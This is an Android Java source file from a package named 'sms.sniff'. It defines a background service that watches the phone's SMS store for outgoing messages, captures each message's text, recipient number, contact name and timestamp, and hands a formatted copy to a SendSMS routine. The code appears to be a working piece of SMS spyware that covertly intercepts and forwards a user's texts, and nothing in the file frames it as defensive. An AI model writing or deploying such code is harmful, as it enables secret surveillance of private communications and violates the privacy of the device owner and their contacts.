package sms.sniff;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;

public class Outgoing extends Service {

	ContentResolver contentResolver;
	Uri uri = Uri.parse(Constants.databaseURI);
	Handler handler;
	private contentObserver contentObserver;

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	@Override
	public void onCreate() {
		contentResolver = getContentResolver();
		contentObserver = new contentObserver(handler);
		contentResolver.registerContentObserver(uri, true, contentObserver);
		super.onCreate();
	}
	
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
	}
	
	@Override
	public void onDestroy() {
		contentResolver.unregisterContentObserver(contentObserver);
		super.onDestroy();
	}

	public class contentObserver extends ContentObserver {
		public contentObserver(Handler handler) {
			super(handler);
		}
		
		@Override
		public void onChange(boolean selfChange) {
			Cursor cursor = contentResolver.query(uri, null, null, null, null);
			cursor.moveToFirst();
			String body = cursor.getString(cursor.getColumnIndex("body"));
			
			if(body.equals(Constants.lastSmsText)) {
				super.onChange(selfChange);
				return;
			}
			
			Constants.lastSmsText = body;
			
			String destinationPhoneNumber = cursor.getString(cursor.getColumnIndex("address"));
			String date = cursor.getString(cursor.getColumnIndex("date"));
			
			Utils utils = new Utils();
			
			String contactName = utils.getContactByPhoneNumber(contentResolver, destinationPhoneNumber);
			String strDate = utils.format(date);
			
			String message = "Enviada Em: " + strDate + "\n"
						   + "Para: " + contactName + " (" + destinationPhoneNumber + ")" + "\n"
						   + "Conteudo: " + body;

			new SendSMS(message, destinationPhoneNumber);
			
			cursor.close();
			
			super.onChange(selfChange);
		}
	}
}
